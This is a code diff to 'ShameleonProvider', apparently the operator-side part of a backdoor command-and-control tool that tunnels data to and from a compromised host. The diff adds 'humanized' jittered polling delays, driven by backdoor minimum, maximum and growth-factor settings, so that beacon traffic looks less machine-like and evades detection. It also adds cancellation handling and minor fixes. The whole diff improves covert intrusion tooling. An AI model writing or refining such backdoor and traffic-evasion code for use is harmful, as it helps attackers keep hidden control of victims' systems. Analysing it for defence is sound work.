@@ -31,26 +31,40 @@ class ShameleonProvider():
         self._buffers: dict[str, str] = {
             'system': '',
         }
+        self._current_delay = self._profile.backdoor_min_delay / 1000
+
+    async def _humanize(self, is_active: bool = True):
+        await asyncio.sleep(self._current_delay)
+        if is_active:
+            self._current_delay = self._profile.backdoor_min_delay / 1000
+        else:
+            self._current_delay = self._current_delay * (1 + self._profile.backdoor_factor_delay)
+            if self._current_delay > self._profile.backdoor_max_delay / 1000:
+                self._current_delay = self._profile.backdoor_max_delay / 1000
 
     async def run(self):
-        while True:
-            # Send chuncks
-            buffer: list[str] = []
-            for _, streams in self._tunnels.items():
-                while not streams['out'].empty():
-                    buffer.append(streams['out'].get(block=False))
-            if len(buffer) > 0:
-                await self._send_payload(buffer)
-                await asyncio.sleep(1)  # TODO: Humanize and use backdoor config
-            # Receive chuncks
-            incoming = await self._get_payload()
-            if len(incoming) > 0:
-                for tunnel_id, data in incoming:
-                    self._tunnels[tunnel_id]['in'].put(data)
-            else:
-                pass
-                # TODO: Increase waiting time using config parameters
-            await asyncio.sleep(1)  # TODO: Humanize and use backdoor config
+        """ Run the provider.
+
+        This method is used to run the provider. It will send and receive data
+        from the backdoor.
+        """
+        try:
+            while True:
+                # Send chuncks
+                buffer: list[str] = []
+                for _, streams in self._tunnels.items():
+                    while not streams['out'].empty():
+                        buffer.append(streams['out'].get(block=False))
+                if len(buffer) > 0:
+                    await self._send_payload(buffer)
+                # Receive chuncks
+                incoming = await self._get_payload()
+                if len(incoming) > 0:
+                    for tunnel_id, data in incoming:
+                        self._tunnels[tunnel_id]['in'].put(data)
+                await self._humanize(len(buffer) > 0 or len(incoming) > 0)
+        except asyncio.CancelledError:
+            pass
 
     async def request_tunnel(self, tunnel_type: str) -> str:
         """ Request a tunnel to the backdoor.
@@ -70,7 +84,7 @@ class ShameleonProvider():
             str: Unique identifier of the tunnel
         """
         print(f"[*] Requesting tunnel for '{tunnel_type}'")
-        tunnel_uuid = str(uuid4()).split('-')[0]
+        tunnel_uuid = str(uuid4()).split('-', maxsplit=1)[0]
         content = f"{tunnel_type}:{tunnel_uuid}"
         self.send_data("system", content.encode('utf-8'))
         while True:  # TODO: add a timeout ?
@@ -80,7 +94,7 @@ class ShameleonProvider():
                 continue
             decoded_data = incomming.decode('utf-8')
             if decoded_data != 'OK':
-                raise Exception('Impossible to create tunnel: %s', decoded_data)
+                raise ConnectionError('Impossible to create tunnel: %s', decoded_data)
             print("[i] tunnel ID:", tunnel_uuid)
             self._tunnels[tunnel_uuid] = {'in': Queue(), 'out': Queue()}
             self._buffers[tunnel_uuid] = ''
